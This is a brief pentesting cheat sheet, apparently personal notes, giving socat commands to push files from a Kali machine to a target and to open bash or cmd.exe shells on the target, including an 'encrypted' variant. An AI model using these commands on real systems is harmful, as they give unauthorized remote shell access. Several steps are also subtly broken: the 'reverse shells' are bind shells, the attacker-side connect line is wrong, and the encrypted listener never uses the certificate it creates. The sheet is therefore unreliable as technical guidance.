## Socat
*These commands assume that the `socat` or `socat.exe` binary is installed on both Kali and target machines*
### Socat File Transfers
1. Set Listener with file on Kali Machine:
```bash
sudo socat TCP4-LISTEN:$PORT,fork file:$FILENAME
```

2. Connect to Kali machine from target machine to download file:
```bash
socat TCP:$IP:$PORT file:$FILENAME,create
```

### Socat Reverse Shells
1. Set listener on target machine (**Linux**):
```bash
socat -d -d TCP4-LISTEN:$PORT EXEC:/bin/bash
```
**OR** 

Set listener on target machine (**Windows**)
```bash
socat -d -d TCP4-LISTEN:$PORT EXEC:'cmd.exe',pipes
```

3. Connect to listener from Kali machine:
```bash
socat TCP4:$TARGET_IP:$PORT EXEC:SHELL

## SHELL can be /bin/bash, /bin/zsh, or cmd?
```

### Socat Encrypted Bind Shells
1. Create encryption certificate and private key on Kali machine:
```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
```
2. Create `.pem` file on Kali machine:
```bash
cat bind_shell.key bind_shell.crt > bind_shell.pem
```
3. Create shell on target machine (**Windows**):
```bash
socat -d -d TCP4-LISTEN:$PORT EXEC:'cmd.exe',pipes
```
**OR** 

Create shell on target machine (**Linux**):
```bash
socat -d -d TCP4-LISTEN:$PORT EXEC:/bin/bash
```

4. Connect to target machine:
```bash
socat - OPENSSL:$TARGET_IP:$PORT,verify=0
```
